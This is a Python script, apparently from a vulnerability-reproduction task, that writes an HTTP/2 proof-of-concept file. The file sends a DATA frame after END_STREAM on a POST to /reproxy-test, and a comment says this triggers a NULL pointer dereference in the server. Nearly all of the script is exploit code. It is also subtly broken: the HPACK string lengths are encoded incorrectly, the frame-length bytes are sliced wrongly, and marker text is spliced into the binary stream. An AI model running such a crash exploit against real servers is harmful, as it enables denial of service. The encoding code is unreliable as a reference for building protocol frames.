import struct

# HTTP/2 connection preface
preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

# Helper to build HPACK encoded headers
def hpack_literal(name, value):
    """Literal header field with incremental indexing"""
    result = struct.pack('B', 0x40 | len(name))
    result += name.encode()
    result += struct.pack('>H', len(value))
    result += value.encode()
    return result

def hpack_literal_no_index(name, value):
    """Literal header field without indexing"""
    result = struct.pack('B', 0x00 | len(name))
    result += name.encode()
    result += struct.pack('>H', len(value))
    result += value.encode()
    return result

# Build HEADERS for POST to /reproxy-test (has_body_stream=1)
headers = b''
headers += hpack_literal(':method', 'POST')
headers += hpack_literal(':path', '/reproxy-test')
headers += hpack_literal(':scheme', 'http')
headers += hpack_literal(':authority', 'localhost')
headers += hpack_literal_no_index('content-length', '100')

def build_frame(frame_type, flags, stream_id, payload=b''):
    length = len(payload)
    return struct.pack('>I', length)[:3] + struct.pack('B', frame_type) + struct.pack('B', flags) + struct.pack('>I', stream_id) + payload

# SETTINGS frame (empty) - stream ID 0
settings = build_frame(4, 0, 0)

# HEADERS frame - stream ID 1, END_HEADERS
headers_frame = build_frame(1, 0x04, 1, headers)

# DATA frame 1 (no END_STREAM) - enters streaming mode
data1 = build_frame(0, 0, 1, b'A' * 10)

# DATA frame 2 with END_STREAM
data2 = build_frame(0, 0x01, 1, b'B' * 10)

# DATA frame 3 (after END_STREAM) - triggers NULL pointer dereference
data3 = build_frame(0, 0, 1, b'C' * 10)

# Combine with MARKER between each frame to simulate separate packets
MARKER = b'\n--MARK--\n'
poc = preface + settings + MARKER + headers_frame + MARKER + data1 + MARKER + data2 + MARKER + data3

with open('/workspace/poc_http2', 'wb') as f:
    f.write(poc)

print(f'PoC size: {len(poc)} bytes')
print('PoC written to /workspace/poc_http2')
